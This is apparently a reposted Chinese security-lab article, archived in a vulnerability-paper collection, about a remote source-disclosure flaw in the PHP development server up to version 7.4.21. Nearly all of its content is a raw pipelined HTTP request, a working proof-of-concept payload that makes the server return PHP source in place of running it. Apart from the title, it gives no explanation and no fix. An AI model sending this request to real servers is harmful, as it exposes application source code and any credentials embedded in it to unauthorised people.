---
source: "MrWQ/vulnerability-paper"
---

# PHP 开发服务器 小于等于 7.4.21 - 远程源泄露

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/D7Wlxp5E4KhepRnYQzNCkw)

PHP 开发服务器 <= 7.4.21 - 远程源泄露
===========================

[Khan 安全攻防实验室](javascript:void(0);) **Khan 安全攻防实验室** 

微信号 KhanCJSH

功能介绍 安全不是一个人，我们来自五湖四海。研究方向 Web 内网渗透，免杀技术，红蓝攻防对抗，CTF。

_2023-02-09 08:23_ _发表于广东_

收录于合集

```
GET /phpinfo.php HTTP/1.1 
Host: pd.research
\r\n
\r\n
GET / HTTP/1.1
\r\n
\r\n

```

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2HS0XhrmxsGdvDx4JozEGJSicNTLawhCWXyjPWbibI4FTXI4JvseVFy6WAY2iczTibbrwEUL78PTtSlA/640?wx_fmt=png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
